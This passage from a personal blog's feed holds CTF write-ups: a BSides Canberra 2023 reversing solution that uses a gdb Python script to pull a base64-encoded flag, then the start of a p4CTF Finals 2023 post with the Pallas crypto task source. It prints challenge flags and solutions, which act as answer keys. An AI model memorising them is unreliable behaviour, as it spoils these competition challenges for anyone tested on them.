        if len(set(next_round_result)) == 1:
            # send number of practice rounds we want to
            # play at same time to avoid taking too
            # long to recieve data
            p.send(b&amp;#34;p\n&amp;#34; * practice_round_count)
            play_game_round()
            break
        practice_round_count &amp;#43;= 1

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;h1 id=&#34;useless-rev---9-solves&#34;&gt;useless (rev) - 9 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There&amp;rsquo;s a weird file recovered from a forensic analysis of the MAYHEM mainframe&amp;hellip; but it doesn&amp;rsquo;t seem to do anything?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are provided with a binary file &lt;a href=&#34;./files/useless&#34;&gt;&lt;code&gt;useless&lt;/code&gt;&lt;/a&gt; which when ran, as the name suggests, seemingly does nothing.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(teddykali㉿teddykali)-[~/…/on premise/Bsides Canberra 2023/rev/useless]
└─$ ./useless    
                                                                                                                                                
┌──(teddykali㉿teddykali)-[~/…/on premise/Bsides Canberra 2023/rev/useless]
└─$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Decompiling the binary doesn&amp;rsquo;t offer much either - there appear to be thousands of functions named &lt;code&gt;continue_x&lt;/code&gt; which just calls the next one. An interesting thing is that some numbers are skipped (e.g &lt;code&gt;continue_1&lt;/code&gt;) however this didn&amp;rsquo;t seem to help either.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//----- (0000000000401000) ----------------------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __noreturn &lt;span style=&#34;color:#a6e22e&#34;&gt;start&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;continue_0&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//----- (0000000000401019) ----------------------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __noreturn &lt;span style=&#34;color:#a6e22e&#34;&gt;continue_0&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;continue_2&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//----- (000000000040103B) ----------------------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __noreturn &lt;span style=&#34;color:#a6e22e&#34;&gt;continue_2&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;continue_3&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// this repeats until continue_2024() !
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The decompilation is rendering useless - looks like we&amp;rsquo;ll need to dig deeper.&lt;/p&gt;
&lt;p&gt;After loading the binary into gdb (with the &lt;a href=&#34;https://github.com/pwndbg/pwndbg&#34;&gt;pwndbg&lt;/a&gt; extension), we use &lt;code&gt;starti&lt;/code&gt; to start running the binary but immediantly breaking, as otherwise the program would just exit.&lt;/p&gt;
&lt;p&gt;Next, stepping through instruction with &lt;code&gt;si&lt;/code&gt; , I noticed an unusual value in the &lt;code&gt;rax&lt;/code&gt; register, which turned out to be a printable character.&lt;/p&gt;

  &lt;img src=&#34;./img/gdb_1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;Using &lt;code&gt;watch $rax&lt;/code&gt; to watch the value of &lt;code&gt;rax&lt;/code&gt; and break every time the value of &lt;code&gt;rax&lt;/code&gt; changes, we slowly retrieve a stream of printable characters: &lt;code&gt;SW4gdGhlIHJ&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/gdb_2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;It looks like base64 - and decoding &lt;code&gt;SW4gdGhlIHJ&lt;/code&gt; from base64 yields &lt;code&gt;In the r&lt;/code&gt;. Not the flag, but probably the right track!&lt;/p&gt;
&lt;p&gt;Given there are over 2000 functions, we probably don&amp;rsquo;t want to do this manually. &lt;code&gt;gdb&lt;/code&gt; supports scripting with python, so lets automate it!&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;execute(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;starti&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;execute(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;watch $rax&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;execute(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;continue&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parse_and_eval(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;$rax&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cast(gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;lookup_type(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;long&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(value)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(value)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;flag &lt;span style=&#34;color:#e6db74&#34;&gt;= }&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running our script with &lt;code&gt;source gdb_script.py&lt;/code&gt; prints out a very long base64 encoded string.&lt;/p&gt;

  &lt;img src=&#34;./img/gdb_3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;Adjusting some base64 offsets (sometimes there can be consecutive base64 characters, in which case &lt;code&gt;rax&lt;/code&gt; doesn&amp;rsquo;t change, resulting in some characters being missed - thanks to &lt;a href=&#34;https://twitter.com/JJJollyjim&#34;&gt;Jamie&lt;/a&gt; for correcting me on this!) and decoding from base64 in &lt;a href=&#34;https://gchq.github.io/CyberChef/#recipe=From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true,false)&amp;amp;input=NGdkR2hsSUhKbFlXeHRJRzltSUdOdlpHVWdZVzVrSUd0bGVYTXNJR0VnWTJoYkd4bGJtZGxJR1pzWVdjZ2RXNW1kWEpzY3l3S1FTQmpjbmx3ZEdsaklHbHVkbWwwWVhScGIyNGdkRzhnZEdWemRDQjBhR1VnYzJoY25CbGMzUWdiV2x1WkhNZ2IyWWdkR2hsSUhkdmNteGtMZ3BCSUVOVVJpZHpJR1Z0WW14bGJTd2dhVzRnZEdobElHUnBaMmwwWVd3Z1pHOXRZV2x1SUdsMElHWnNhV1Z6TEFwQklIQjFlbnBzWlNCbWIzSWdkR2hsSUdOMWNtbHZkWE1zSUdFZ2NISnBlbVVnWm05eUlIUm9aU0IzYVhObExnb0tTWFJ6SUdOdmJHOXljeUJoY21WdUozUWdZM0pwYlhOdmJpd2dibTl5SUhOMGNtbHdaWE1nYjJZZ2NtVmtJR0Z1WkNCM2FHbDBaU3dLUW5WMElHRWdjR2w0Wld4aGRHVmtJSFJoY0dWemRISjVMQ0JoSUcxaGRISnBlQ0J2WmlCaWVYUmxjeUJwYmlCemFXZG9kQzRLU1c0Z1ltbHVZWEo1SUdKeWFXeHNhV0Z1WTJVc0lHbDBJR0psWTJ0dmJuTWdkMmwwYUNCaElHZHNiM2NzQ2tFZ2FHRmphMlZ5SjNNZ2NYVmxjM1FzSUhkb1pYSmxJR2hwWkdSbGJpQnJibTkzYkdWa1oyVWdiV0Y1SUdac2IzY3VDZ3BKYmlCMGFHVWdZbWx1WVhKNUlHSnlaV1Y2WlN3Z2FYUWdabXgxZEhSbGNuTWdiR2xyWlNCaElHUnBaMmwwWVd3Z1pISmxZVzBzQ2tFZ2RISmxZWE4xY21VZ2JXRndJRzltSUdKcGRITWdZVzVrSUdKNWRHVnpMQ0JwYmlCMGFHVWdZM2xpWlhJZ2MzUnlaV0Z0TGdwRllXTm9JR05vWVd4c1pXNW5aU0JtYkdGbkxDQmhJR05wY0dobGNtVmtJSFJoYkdVZ2RHOGdZbVVnZFc1MGIyeGtMQXBHYjNJZ2RHaHZjMlVnZDJodklHUmhjbVVnZEc4Z2RtVnVkSFZ5WlN3Z1ptOXlJSFJvWlNCaWNtRjJaU0JoYm1RZ2RHaGxJR0p2YkdRdUNncFVhR1VnWm14aFp5QnBjeUJqZVdKbFlYSnplMVUxTTJ3ek5UVmZZblYwWHpWME1XeHNYMmN3ZEY5MGFETmZabXhBWjMwdUNncFhhWFJvYVc0Z2FYUnpJR1Z1YVdkdFlTd2dkR2hsY21VZ2JHbGN5QmhJR2hwWkdSbGJpQnJaWGtzQ2tFZ2NtbGtaR3hsSUhSdklHSmxJSE52YkhabFpDd2dZU0JrYjI5eUlIUnZJSE5sZENCdGFXNWtjeUJtY21WbExncEdjbTl0SUhOMFpXZGhibTluY21Gd2FHbGpJSE5sWTNKbGRITWdkRzhnWTNKNWNIUnBZeUJqYkhWbGN5QmpiMjVqWldGc1pXUXNDbFJvWlNCRFZFWWdZMmhiR3hsYm1kbElHWnNZV2NzSUdFZ2NIVjZlbXhsSjNNZ1ptRjBaU0J5WlhabFlXeGxaQzRLQ2tFZ2JXRjZaU0J2WmlCaGJHZHZjbWwwYUcxekxDQmhJR3hoWW5seWFXNTBhQ0J2WmlCamIyUmxMQXBKYmlCMGFHbHpJR1JwWjJsMFlXd2dkMmxzWkdWeWJtVnpjeXdnWW5KaGRtVWdhSFZ1ZEdWeWN5QmxjbTlrWlM0S1ZHaGxhWElnYldsdVpITW5JSFJsY25KaGFXNHNJSGRwZEdnYkc5bmFXTW5jeUIwYjNKamFDQnBiaUJvWVc1a0xBcFVhR1Y1SUdwdmRYSnVaWGtnZEdoeWIzVm5hQ0IwYUdVZ1lubDBaWE1zSUhSb1pYa2diV0Z3SUhSb1pTQmthV2RwZEdGc0lHeGhibVF1Q2dwWGFYUm9JR1ZoWTJnWW5sMFpTQmtaV05wY0dobGNtVmtMQ0IzYVhSb0lHVmhZMmdZbmwwWlNCMWJuWmxhV3hsWkN3S1ZHaGxJR05vWVd4c1pXNW5aU0JtYkdGbklHUnlZWGR6SUc1bFlYSmxjaXdnYVhSeklHMTVjM1JsY25rZ2RXNXpaV0ZzWldRdUNrRnVaQ0IzYUdWdUlIUm9aU0JtYVc1aGJDQmpiMlJsSUdaaGJHeHpJR2x1ZEc4Z2FYUnpJSEJzWVdObExBcEJJSFpwY25SMVlXd2dkbWxqZEc5eWVTd2dZU0IwY21sMWJYQm9ZVzUwSUdWdFluSmhZMlV1Q2dwVGJ5d2djMkZzZFhSbElIUm9aU0JqYUdGc2JHVnVaMlVnWm14aFp5QnBiaUIwYUdVZ2NtVmhiRzBnYjJZZ1lubDBaWE1nWVc1a0lHdGxlWE1zQ2xkb1pYSmxJR2hZMnRsY25NZ1lXNWtJR052WkdWaWNtVmhhMlZ5Y3lCelpXVnJJSFJvWlNCaGJuTjNaWEp6SUdsMElHWnlaV1Z6TGdwSmJpQjBhR1VnZDI5eWJHUWdiMllnUTFSR0xDQjNhR1Z5WlNCdGFXNWtjeUJoY21VZ2MyVjBJSFJ2SUhOaGFXd3NDbFJvWlNCamFHRnNiR1Z1WjJVZ1pteGhaeUJ6ZEdGdVpITWdkR0ZzYkN3Z1lTQmthV2RwZEdGc0lHaHZiSGtnWjNKaGFXd3U8&#34;&gt;CyberChef&lt;/a&gt;, we get the flag!&lt;/p&gt;

  &lt;img src=&#34;./img/cyberchef.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;&lt;code&gt;cybears{U53l355_but_5t1ll_g0t_th3_fl@g}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Although we already got the flag, let&amp;rsquo;s take a deeper look into what was going on.&lt;/p&gt;
&lt;p&gt;A quick look at the disassembly shows &lt;code&gt;ebx&lt;/code&gt; (lower 32 bits of &lt;code&gt;rbx&lt;/code&gt;) being set to &lt;code&gt;0x6a0&lt;/code&gt;, and &lt;code&gt;rax&lt;/code&gt; is set to the value at address &lt;code&gt;rbx + 0x40a000&lt;/code&gt;.&lt;/p&gt;

  &lt;img src=&#34;./img/gdb_4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;That means that &lt;code&gt;rax&lt;/code&gt; was just being set to some data pointed at by &lt;code&gt;rbx&lt;/code&gt; (plus an offset of &lt;code&gt;0x40a000&lt;/code&gt;). However, the value &lt;code&gt;rbx&lt;/code&gt; is set to seems to not be constant for each function, so watching the value of &lt;code&gt;rax&lt;/code&gt; is probably still the best solution.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This was the first time I had gone to BSides Canberra, and it was by far the best and largest conference I had been to!&lt;/p&gt;
&lt;p&gt;Thanks to &lt;a href=&#34;https://twitter.com/cybearsCTF&#34;&gt;Cybears&lt;/a&gt; for making some neat challenges, and also &lt;a href=&#34;https://twitter.com/infosectcbr&#34;&gt;Infosect&lt;/a&gt; for covering the cost of my flights and hotel through their &lt;a href=&#34;https://www.bsidesau.com.au/assistance.html&#34;&gt;Assistance Program&lt;/a&gt;!&lt;/p&gt;
&lt;p&gt;It was great fun meeting everyone, from skateboarding dogs to DownUnder CTF organisers, and I look forward to next year&amp;rsquo;s conference!&lt;/p&gt;
&lt;p&gt;Thanks for reading :)&lt;/p&gt;
&lt;p&gt;Feel free to DM me on Discord &lt;code&gt;thesavageteddy&lt;/code&gt; or Twitter &lt;a href=&#34;https://twitter.com/teddyctf&#34;&gt;&lt;code&gt;teddyctf&lt;/code&gt;&lt;/a&gt; if you have any questions, corrections, or just want to chat!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;teddy / TheSavageTeddy&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;./img/group_photo.jpeg&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


</content>
    </item>
    
    <item>
      <title>CTF Writeups - p4CTF Finals 2023 in Poland</title>
      <link>https://TheSavageTeddy.github.io/featured/p4ctf-finals-2023/</link>
      <pubDate>Thu, 22 Jun 2023 21:20:00 +0800</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/featured/p4ctf-finals-2023/</guid>
      <description>Overview p4CTF Finals was an onsite event held in June 2023 in Katowice, Poland. Together with Emu Exploit, I qualified for event in the p4CTF qualifiers and had the opportunity to go to Poland to meet and compete with many top teams in the world, including The Flat Network Society, Dragon Sector, justCatTheFish, hxp, 0rganizers, ALLES and FluxFingers.
Before we could compete in the event, we had to first get to Poland, which proved to be a pain as our travel time was 50 hours - 30 hours across three flights to Paris, and 20 hours on the bus to Katowice.</description>
      <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;p4CTF Finals was an onsite event held in June 2023 in Katowice, Poland. Together with Emu Exploit, I qualified for event in the p4CTF qualifiers and had the opportunity to go to Poland to meet and compete with many top teams in the world, including &lt;a href=&#34;https://twitter.com/FlatNetworkOrg&#34;&gt;&lt;code&gt;The Flat Network Society&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/DragonSectorCTF&#34;&gt;&lt;code&gt;Dragon Sector&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/justCatTheFish&#34;&gt;&lt;code&gt;justCatTheFish&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/hxpctf&#34;&gt;&lt;code&gt;hxp&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/0rganizers&#34;&gt;&lt;code&gt;0rganizers&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/allesctf&#34;&gt;&lt;code&gt;ALLES&lt;/code&gt;&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/fluxfingers&#34;&gt;&lt;code&gt;FluxFingers&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Before we could compete in the event, we had to first get to Poland, which proved to be a pain as our travel time was 50 hours - 30 hours across three flights to Paris, and 20 hours on the bus to Katowice. However, it was definetely worth the time, as we got to also see some tourist attractions in Paris!&lt;/p&gt;

  &lt;img src=&#34;./img/emu_paris.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; max-height: 40em&#34;  /&gt;


&lt;p&gt;Also, thanks to the &lt;a href=&#34;https://twitter.com/p4_team&#34;&gt;p4CTF team&lt;/a&gt; for hosting an amazing event, and our sponsors who made the trip possible!&lt;/p&gt;
&lt;p&gt;Below are writeups for some challenges I solved during the 24h CTF, which were quite unique!&lt;/p&gt;
&lt;p&gt;For example, for sanity check, you had to go to the p4 organiser&amp;rsquo;s desk and eat (edible) bugs in order to obtain the paper containing network credentials for some of the challenges, and the flag was &lt;code&gt;p4{eat-bugs-gain-sanity}&lt;/code&gt; which I thought was quite funny. The bugs were crunchy.&lt;/p&gt;
&lt;h1 id=&#34;challenge-overview&#34;&gt;Challenge Overview&lt;/h1&gt;
&lt;p&gt;There were a total of 18 challenges - I mostly solved crypto, and got a funny unintended solution on a misc. Below are writeups of some of these challenges:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;Challenge&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;#pallas-crypto---12-solves&#34;&gt;Pallas&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;crypto&lt;/td&gt;
&lt;td&gt;12&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;#aes_observed-crypto---6-solves&#34;&gt;aes_observed&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;crypto&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;#pepega-packets-misc---5-solves&#34;&gt;Pepega Packets&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;misc&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Enjoy!&lt;/p&gt;
&lt;h1 id=&#34;pallas-crypto---12-solves&#34;&gt;Pallas (crypto) - 12 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Tell me my secret&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given python source &lt;code&gt;task.py&lt;/code&gt; and the output &lt;code&gt;output.txt&lt;/code&gt;.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;task.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from pwn import *

from sec import secret
print(len(secret))

text   = b&amp;#34;The Pallas&amp;#39;s cat is a highly specialised predator of small mammals, which it catches by stalking or ambushing near exits of burrows.&amp;#34;

def bits_to_bytes(l):
	l = [str(f) for f in l]
	l=&amp;#34;&amp;#34;.join(l)
	final = [l[i * 8:(i &amp;#43; 1) * 8] for i in range((len(l) &amp;#43; 8 - 1) // 8 )]
	final = [int(x,2) for x in final]
	return bytes(final)

def bytes_to_bits(bb):
	r = &amp;#34;&amp;#34;
	for c in bb:
		r &amp;#43;= bin(c)[2:].rjust(8,&amp;#34;0&amp;#34;)
	r= list(map(int, r))
	return r

def my_crypto_inner(text, secret):
	tl = len(text)
	sl = len(secret)
	enc = [0]*len(text)
	for i in range(tl):
		enc[i]=text[i]
		enc[i]^=secret[i % sl]
		for div in range(1, tl):
			if i%div == 0:
				enc[i] ^= enc[(i-div) % sl]
			if i&amp;gt;0 and div%i == 0:
				enc[i] ^= text[(i-div) % sl]
	return enc

def my_crypto(text, secret):
	text = bytes_to_bits(text)
	secret = bytes_to_bits(secret)
	res = my_crypto_inner(text,secret)
	return bits_to_bytes(res)

encrypted = my_crypto(text,secret)
print(encrypted)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;&lt;code&gt;output.txt&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86\x8b\xbe\x00\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;I&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;M&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1f\xe8\x87\x8e\xa3\xec&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\x8a\xbd\xd4\xe7\x92&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa1\x8c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;F&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x06\x8a\xa8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa6\xcd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xaf\xce\xbc\x90&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;go&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc4\r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xac\xb1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ng&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd5\x88\\\x07\xa9&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;z&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\xc2\x9f\x9c\x89\xf8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Ut&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf5\xdc\xdd&lt;/span&gt;&lt;span 